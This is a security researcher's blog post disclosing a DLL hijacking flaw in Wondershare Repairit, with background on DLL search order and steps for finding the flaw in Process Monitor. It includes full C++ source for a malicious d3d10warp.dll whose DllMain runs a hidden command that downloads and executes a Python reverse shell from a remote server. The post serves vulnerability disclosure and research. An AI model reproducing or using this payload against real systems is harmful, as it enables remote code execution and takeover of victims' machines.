---
title:  "Looking into Wondershare Repairit DLL Hijacking issue"
layout: post
categories: malware-analysis
---


## Table Of Contents


- Background.
- DLL Hijacking.
- So why Wondershare ?
  - Looking into the specifications.
  - Crafting a malicious DLL.
  - Getting a callback.
- What's next?
- References.



## Background.

Recently, at my work, I have been noticing an already upsurging and very common trend of DLL-Hijacking abuse by nation-state sponsored threat groups across the globe. As, I believe, that there is no end to learning and re-learning things, therefore, I have been analyzing a lot of malware samples involved with DLL Sideloading, DLL Hijacking and similar attack techniques. So, one day, I hunted a sample fro m telemetry, which mentioned a malicious DLL being loaded into Wondershare [Repairit Software](https://repairit.wondershare.com/). Interestingly, I found out that there is a DLL known as `drstat.dll` which is loaded by the executable and the exact similar DLL name which is malicious in nature, with similar `export` functions is being loaded by WonderShare leading to further execution of malware. Therefore, as a curious researcher, I decided to look ahead about the DLL and it turns out that there are no existing cases of DLL with similar name being abused, so we can say, that this was the `first?` case In-The-Wild[ITW]. So, I decided to dig further and analyze it, going ahead, I also found another DLL known as `d3d10warp.dll` which is also being loaded in the wrong order, where one also can place a DLL with similar name and execute to privilege escalation? 

![image](https://github.com/user-attachments/assets/003c4e97-e768-4d39-b430-6ebfe11a45ae)



Well, Wondershare has a good [track-record](https://app.opencve.io/cve/?vendor=wondershare) of making safe and reliable software, therefore, I decided to bring in-light on how these can be leveraged by bad guys in near future. 


## DLL Hijacking.

### So, what's a DLL ? 

 Modern day software like ChatGPT says,

```
A DLL (Dynamic-Link Library) in the context of reverse engineering and Windows internals is a compiled binary module that contains code, data, and resources designed to be loaded and shared by multiple processes at runtime.DLLs are fundamental to the Windows operating system’s modular architecture, allowing both the OS and applications to offload functionality into reusable components.
From a reverse engineering standpoint, DLLs are particularly important because they often house core functionality such as system APIs, third-party libraries, or even malicious payloads.
Analysts study the Import Address Table (IAT) to identify which external functions a program relies on, often giving insight into its behavior or purpose. Additionally, DLLs expose functions through an export table, which can be statically analyzed or dynamically resolved at runtime via functions like `LoadLibrary` and `GetProcAddress`. Malicious actors also commonly abuse DLLs via DLL hijacking, sideloading, or reflective loading making them crucial artifacts in malware analysis. Understanding how DLLs interact with processes, memory, and the Windows loader is essential for dissecting both legitimate and malicious software.
```
TL;DR : a DLL is a compiled binary containing code and data that's used by executables (or other DLLs). Its functions are exposed through an export table, allowing other programs to dynamically link and call them at runtime.


### So, how should be a DLL loaded?

Well, there are multiple ways a DLL can be loaded depending on the application developer and needs, but there are security concerns related to them, therefore always specify exact location [ fully qualified path ] , like using `C:\Windows\<path>\example.dll` instead of just `example.dll`  and many more safety steps to load the DLL.


### So, what's DLL search order?

The DLL search order is the sequence of directories Windows checks to find a DLL (Dynamic Link Library) when a program tries to load one without specifying its exact location.

The Order:

When a program loads a DLL, Windows looks in these places in this order:

- Application's folder (where the program is installed).
- System directory (e.g., C:\Windows\System32).
- 16-bit system directory (e.g., C:\Windows\System).
- Windows directory (e.g., C:\Windows).
-  Current working directory (where the program is running from).
- Directories in the PATH (folders listed in the system's PATH environment variable).

### Why does search order matters?

If a malicious DLL with the same name as the expected DLL is placed in a directory checked first (like the application's folder), Windows may load it instead, leading to security risks like DLL hijacking.

So, I hope I could simplify, what exactly is DLL Hijacking, if you want an extremely clarity oriented idea of what exactly DLL Hijacking is, I would suggest you this [resource](https://itm4n.github.io/windows-dll-hijacking-clarified/).


## So why Wondershare?

Wondershare, has had many cases of DLL Hijacking issues such as one in [Filmora](https://cvewalkthrough.com/cve-2020-23438-wondershare-filmora-9-2-11-trojan-dll-hijacking-leading-to-privilege-escalation/), so in this section, we will use multiple tools at our disposal to prove our point I.e., DLL Hijacking vulnerability in Wondershare Repairit Software. 


### Looking in to the specifications


*Vulnerable Software* : Wondershare Repairit.

*Issue* : Malicious DLL Hijacking.

*Affected Version* : Up to 6.5.8.5

*Fixed Version* : N/A.

*Vendor Homepage* : [Wondershare Repairit](https://repairit.wondershare.com/)


#### Overview

Wondershare Repairit 6.5.8.5 is vulnerable to DLL hijacking, which can allow an attacker with local access to execute arbitrary code by placing a malicious DLL ( `d3d10warp.dll` ) in a specific user-writable directory. Repairit incorrectly searches for DLLs in its own directory before system paths, enabling code execution on launch. The executable searches for DLL initially at `C:\Users\<username>\Wondershare\Wondershare Repairit\` . Any attacker with malicious intention can craft a malicious DLL into this directory, and it shall load, leading to execution of malicious code with elevated privileges. 

Let us look into identifying the vulnerable DLL loading path. One can reproduce this issue follwing the similar technique / manner : 

- Run Process Monitor : One can download, process monitor from [here](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon).
- Once you are done, downloading Process Monitor, apply these following steps.

  ![image](https://github.com/user-attachments/assets/500f0860-6de4-44d8-9128-6d3400d1cb00)

- Move ahead to `Filters`.

  ![image](https://github.com/user-attachments/assets/688a9269-6df0-47bd-a809-f747c3b51a11)

- Once you are done pivoting to Filters, and apply these filters in this manner.
    - Process Name is repairit.exe → Add
    - Path contains .dll → Add
    - Result is NAME NOT FOUND → Apply

- Run Wondershare Repairit and check on Logs.

  ![image](https://github.com/user-attachments/assets/112cba05-8e6c-4ca3-9b6f-97f6f694f6b3)

- So, we can see, that it is loaded from a user-writable folder, and the application looks for `d3d10warp.dll` there first, which makes it a textbook example of DLL Hijacking. Now, in the next step, we will craft a malicious DLL and see if we can execute malicious code. 



### Crafting a malicious DLL. 

You can definitely use modern day command and control software like Metasploit, Cobalt Strike, Mythic , Sliver, Brute Ratel , Nighthawk and much more to generate a malicious DLL payload, although in my case, I developed a small DLL payload, which prompts a simple `calculator.exe` into the target screen , then downloads a malicious reverse shell in python from a remote server, further executing the reverse-shell and giving us a shell. 

Here is the C++ code :

```cpp
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        
        ShellExecuteA(NULL, "open", "calc.exe", NULL, NULL, SW_SHOWNORMAL);

       
        const char* url = "http://192.xxx.xx.xxx:8000/shell.py";

        char cmdLine[1024];
        sprintf_s(cmdLine, sizeof(cmdLine),
            "cmd.exe /c python -c \"import urllib.request; exec(urllib.request.urlopen('%s').read())\"",
            url);

        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);

        BOOL result = CreateProcessA(
            NULL,
            cmdLine,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        );

        if (result)
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    return TRUE;
}
```

You can compile it using your favorite compiler. Next, we will place the DLL in the same folder. 

![image](https://github.com/user-attachments/assets/d23fd374-ac68-4b66-8406-1bd97aa1f32b)

And, we have placed our malicious DLL in the folder or directory, preffered by Wondershare Repairit. Next, let us get a callback! 


### Getting a callback. 

![image](https://github.com/user-attachments/assets/afb5eae8-55b1-4c8a-8877-54895f1733d6)


![image](https://github.com/user-attachments/assets/2cfd7348-0554-435e-815e-394fd535d3b3)


Finally, we can see that once we executed the Wondershare Repairit Software, and a crafted DLL payload, which basically pops a small calculator, also gives us a reverse-shell, which finally clears the motive, that we can run malicious software via WonderShare Repairit, leading to potential priviledge escalation. 

If you want to access the entire POC, please move ahead to view the [video.](https://drive.google.com/file/d/1HYrV2lX1f0GOMOU6KSBhCUv9GAbt4ogq/view?usp=sharing)


### What's next?

Well, this was one of an example, on how there is a DLL hijacking issue which could lead to further escalation, I have also released another research on a Chinese nexus threat actor using DLL Hijacking in similar software to load a DLL implant which is known as VELETRIX, leading to VShell malware. You can read the research [here](https://www.seqrite.com/blog/operation-dragonclone-chinese-telecom-veletrix-vshell-malware/). I believe, there are some more gifts to be uncovered, but within my time limitation, I was able to find, only two of them. 


### References. 

- [ DLL Hijacking in Filmora. ](https://cvewalkthrough.com/cve-2020-23438-wondershare-filmora-9-2-11-trojan-dll-hijacking-leading-to-privilege-escalation/)
